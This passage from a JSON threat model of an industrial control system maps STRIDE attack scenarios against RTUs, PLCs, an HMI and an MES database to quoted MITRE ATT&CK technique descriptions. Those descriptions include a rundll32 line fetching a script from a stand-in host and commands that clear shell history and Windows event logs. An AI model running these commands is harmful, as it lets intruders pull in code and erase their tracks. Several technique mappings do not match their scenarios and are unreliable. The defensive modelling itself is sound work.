            "Assumptions": [
                {
                    "Assumption": "The RTU lacks robust authentication mechanisms",
                    "Role": "Attacker",
                    "Condition": "RTU does not use secure authentication protocols"
                },
                {
                    "Assumption": "There is network connectivity between the attacker and the Control Center",
                    "Role": "Attacker",
                    "Condition": "Attacker presence within network range"
                },
                {
                    "Assumption": "The control commands are not encrypted",
                    "Role": "Attacker",
                    "Condition": "Plain text or weak encryption for control commands"
                }
            ],
            "Potential Impact": "Unauthorized control commands could disrupt manufacturing processes.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity theft",
                "control command",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker poses as a legitimate user to access the HMI at the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "User credentials are predictable or easily phished",
                    "Role": "Attacker",
                    "Condition": "Weak password policies or successful phishing campaign"
                },
                {
                    "Assumption": "There is remote access capability to the HMI",
                    "Role": "Attacker",
                    "Condition": "HMI accessible over the internet or WAN"
                },
                {
                    "Assumption": "User identity is not thoroughly verified",
                    "Role": "Attacker",
                    "Condition": "No multi-factor authentication"
                }
            ],
            "Potential Impact": "Confidential operational data could be disclosed or altered.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential theft",
                "HMI",
                "attack"
            ],
            "mitre_technique": {
                "name": "VNC",
                "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)",
                "id": "attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b",
                "technique_id": "T1021.005"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a cloud service endpoint, intercepting data intended for the cloud.",
            "Assumptions": [
                {
                    "Assumption": "The address resolution protocol can be manipulated",
                    "Role": "Attacker",
                    "Condition": "Weak address resolution protocols"
                },
                {
                    "Assumption": "The gateway does not validate endpoint authenticity",
                    "Role": "Attacker",
                    "Condition": "Lack of endpoint validation mechanisms"
                },
                {
                    "Assumption": "The data is not encrypted in transit",
                    "Role": "Attacker",
                    "Condition": "Data transmitted in plain text"
                }
            ],
            "Potential Impact": "Sensitive operational data could be intercepted.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "endpoint",
                "data interception",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of an RTU to change its behavior.",
            "Assumptions": [
                {
                    "Assumption": "RTU firmware can be remotely updated",
                    "Role": "Attacker",
                    "Condition": "Remote firmware update capability"
                },
                {
                    "Assumption": "Firmware validation is either absent or weak",
                    "Role": "Attacker",
                    "Condition": "Lack of digital signatures or checksums"
                },
                {
                    "Assumption": "Attacker has access to the network",
                    "Role": "Attacker",
                    "Condition": "Network accessibility"
                }
            ],
            "Potential Impact": "Device behavior is altered, leading to incorrect data processing or control commands.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "RTU",
                "network"
            ],
            "mitre_technique": {
                "name": "Bootkit",
                "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "id": "attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d",
                "technique_id": "T1067"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data stored in the MES database affecting production workflows.",
            "Assumptions": [
                {
                    "Assumption": "The database does not employ stringent access controls",
                    "Role": "Attacker",
                    "Condition": "Insufficient database access controls"
                },
                {
                    "Assumption": "The attacker possesses sufficient privileges",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials with access"
                },
                {
                    "Assumption": "There is a lack of monitoring for database integrity",
                    "Role": "Attacker",
                    "Condition": "No integrity monitoring solutions"
                }
            ],
            "Potential Impact": "Production processes are disrupted due to altered workflows.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database",
                "MES",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the configuration of a PLC via a direct connection to change control logic.",
            "Assumptions": [
                {
                    "Assumption": "Direct access to the PLC is allowed without adequate security",
                    "Role": "Attacker",
                    "Condition": "Unauthorized direct connection to PLC"
                },
                {
                    "Assumption": "Control logic changes are not logged",
                    "Role": "Attacker",
                    "Condition": "Absence of change logging mechanisms"
                },
                {
                    "Assumption": "Configuration changes are not subject to verification",
                    "Role": "Attacker",
                    "Condition": "Lack of configuration review and verification"
                }
            ],
            "Potential Impact": "Industrial operations are compromised due to altered control logic.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "PLC",
                "control logic",
                "configuration"
            ],
            "mitre_technique": {
                "name": "Gather Victim Host Information",
                "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                "id": "attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f",
                "technique_id": "T1592"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies issuing malicious commands to field devices.",
            "Assumptions": [
                {
                    "Assumption": "No non-repudiation mechanisms for command issuing",
                    "Role": "Attacker",
                    "Condition": "Logs do not capture or authenticate command issuance"
                },
                {
                    "Assumption": "Field devices execute commands without verification",
                    "Role": "Attacker",
                    "Condition": "No command authentication on field devices"
                },
                {
                    "Assumption": "Command logs can be altered or deleted",
                    "Role": "Attacker",
                    "Condition": "Insufficient log protection mechanisms"
                }
            ],
            "Potential Impact": "Difficulty in tracing the source of malicious activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "command",
                "field devices",
                "logging"
            ],
            "mitre_technique": {
                "name": "Rundll32",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
                "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
                "technique_id": "T1218.011"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user performs unauthorized actions and denies responsibility.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate auditing and logging practices",
                    "Role": "User",
                    "Condition": "Logs do not capture sufficient details"
                },
                {
                    "Assumption": "User actions are not sufficiently signed or authenticated",
                    "Role": "User",
                    "Condition": "Lack of strong authentication"
                },
                {
                    "Assumption": "Log tampering is possible",
                    "Role": "User",
                    "Condition": "Logs are not immutable"
                }
            ],
            "Potential Impact": "Unauthorized changes remain untraceable, damaging integrity and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user actions",
                "logging",
                "auditing"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker uses compromised credentials to trigger malicious actions and denies involvement.",
            "Assumptions": [
                {
                    "Assumption": "Compromised credentials are not promptly detected",
                    "Role": "Attacker",
                    "Condition": "No immediate detection of compromised credentials"
                },
                {
                    "Assumption": "User actions are not signed or traced back accurately",
                    "Role": "Attacker",
                    "Condition": "Insufficient action logging and tracing"
                },
                {
                    "Assumption": "System does not prompt for additional verification",
                    "Role": "Attacker",
                    "Condition": "No re-authentication prompts for sensitive actions"
                }
            ],
            "Potential Impact": "Negative actions can be disowned, complicating incident response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "compromised credentials",
                "malicious actions",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data is intercepted during transmission to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without strong encryption",
                    "Role": "Attacker",
                    "Condition": "Weak or no encryption protocols during transmission"
                },
                {
                    "Assumption": "Attacker has access to the network path",
                    "Role": "Attacker",
                    "Condition": "Attacker can eavesdrop on network traffic"
                },
                {
                    "Assumption": "No measures to detect data interception",
                    "Role": "Attacker",
                    "Condition": "Lack of intrusion detection systems"
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data to unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "cloud services",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the MES database and extracts sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Weak access control measures on the database",
                    "Role": "Attacker",
                    "Condition": "Insufficient access restrictions"
                },
                {
                    "Assumption": "Compromised user credentials enable unauthorized access",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials are used"
                },
                {
                    "Assumption": "No encryption of sensitive data within the database",
                    "Role": "Attacker",
                    "Condition": "Sensitive data stored in plain text"
                }
            ],
            "Potential Impact": "Critical business data is exposed leading to potential competitive and operational disadvantage.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "database access",
                "MES",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud service misconfiguration leads to unintended public exposure of sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are not securely configured",
                    "Role": "Admin",
                    "Condition": "Misconfigured access settings on cloud storage"
                },
                {
                    "Assumption": "Sensitive data is stored without adequate access control",
                    "Role": "Admin",
                    "Condition": "Lack of access control policies"
                },
                {
                    "Assumption": "No monitoring of cloud storage permissions",
                    "Role": "Admin",
                    "Condition": "Insufficient permissions auditing"
                }
            ],
            "Potential Impact": "Large-scale disclosure of confidential information to unauthorized parties.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud configuration",
                "data exposure",
                "access control"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker initiates a DDoS attack on the Control Center's WAN, disrupting communication with RTUs.",
            "Assumptions": [
                {
                    "Assumption": "WAN does not have adequate DDoS protection",
                    "Role": "Attacker",
                    "Condition": "Lack of DDoS mitigation tools"
                },
                {
                    "Assumption": "The attacker has sufficient resources to generate a high volume of traffic",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or similar resources"
                },
                {
                    "Assumption": "Communication channels are not redundant",
                    "Role": "Admin",
                    "Condition": "No alternate communication paths"
                }
            ],
            "Potential Impact": "Operational disruption due to loss of communication with field devices.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "WAN",
                "communication disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Ransomware infects the MES, encrypting critical production data and rendering it inaccessible.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient anti-malware measures on MES",
                    "Role": "Attacker",
                    "Condition": "Lack of robust anti-ransomware solutions"
                },
                {
                    "Assumption": "No frequent backups of critical data",
                    "Role": "Admin",
                    "Condition": "Absence of regular data backup practices"
                },
                {
                    "Assumption": "The ransomware can execute with high privileges",
                    "Role": "Attacker",
                    "Condition": "Privilege escalation by ransomware"
                }
            ],
            "Potential Impact": "Production processes grind to a halt due to data inaccessibility.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "ransomware",
                "MES",
                "data encryption"
            ],
            "mitre_technique": {
                "name": "Encrypted/Encoded File",
                "description": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File) \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.",
                "id": "attack-pattern--0d91b3c0-5e50-47c3-949a-2a796f04d144",
                "technique_id": "T1027.013"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malware attack systematically shuts down field devices and PLCs, stopping industrial operations.",
            "Assumptions": [
                {
                    "Assumption": "Field devices can be remotely controlled without strong authentication",
                    "Role": "Attacker",
                    "Condition": "Weak authentication mechanisms on field devices"
                },
                {
                    "Assumption": "Infected devices can propagate the malware",
                    "Role": "Attacker",
                    "Condition": "Malware capable of moving laterally"
                },
                {
                    "Assumption": "No isolation mechanisms for compromised devices",
                    "Role": "Admin",
                    "Condition": "Lack of network segmentation"
                }
            ],
            "Potential Impact": "Manufacturing operations are halted, causing significant downtime.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "field devices",
                "shutdown"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
